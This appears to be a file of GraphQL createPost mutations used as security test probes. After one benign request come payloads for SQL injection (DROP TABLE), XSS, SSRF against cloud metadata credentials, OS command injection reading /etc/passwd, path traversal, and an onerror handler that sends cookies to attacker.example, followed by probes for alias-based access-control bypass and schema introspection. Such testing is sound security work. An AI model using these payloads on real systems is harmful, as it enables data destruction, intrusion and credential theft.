mutation {
  createPost(input: {title: "Hello from GraphQL Tester", body: "This is a simple valid createPost request to verify basic functionality."}) {
    id
    title
    body
  }
}

mutation {
  createPost(input: {title: "Robert'); DROP TABLE posts;--", body: "SQLi test payload in title field. RequestID: 3fa85f64-5717-4562-b3fc-2c963f66afa6"}) {
    id
    title
    body
  }
}

mutation {
  createPost(input: {title: "XSS Probe", body: "<script>window.testXSS = true; alert('xss')</script>"}) {
    id
    title
    body
  }
}

mutation {
  createPost(input: {title: "SSRF Probe", body: "Please fetch: http://169.254.169.254/latest/meta-data/iam/security-credentials/ or https://example.com/ping?u=http://127.0.0.1:8080"}) {
    id
    title
    body
  }
}

mutation {
  createPost(input: {title: "os_cmd_test; cat /etc/passwd", body: "Attempt OS command injection via title; also try backticks: `ls -la /`"}) {
    id
    title
    body
  }
}

mutation {
  createPost(input: {title: "Path Traversal Probe", body: "../../../../../../etc/passwd - attempted path traversal"}) {
    id
    title
    body
  }
}

mutation {
  createPost(input: {title: "HTML Injection Test", body: "<img src=\"x\" onerror=\"fetch('https://attacker.example/steal?c='+document.cookie)\">"}) {
    id
    title
    body
    user {
      id
      name
    }
  }
}

mutation {
  createPost(input: {title: "BypassTest NonAliased", body: "Testing access control enforcement with a normal mutation call."}) {
    id
    title
  }
}

mutation {
  bypass: createPost(input: {title: "BypassTest Aliased", body: "Testing access control enforcement using an alias to detect deny-bypass."}) {
    id
    title
  }
}

query {
  createPost(name: "CreatePostInput") {
    name
    kind
    inputFields {
      name
      type {
        name
        kind
      }
    }
  }
}

mutation {
  createPost(input: {title: "FieldSuggest Probe", body: "Requesting field suggestion hints by selecting multiple common return fields."}) {
    id
    title
    body
    createdAt
    user {
      id
      name
    }
  }
}
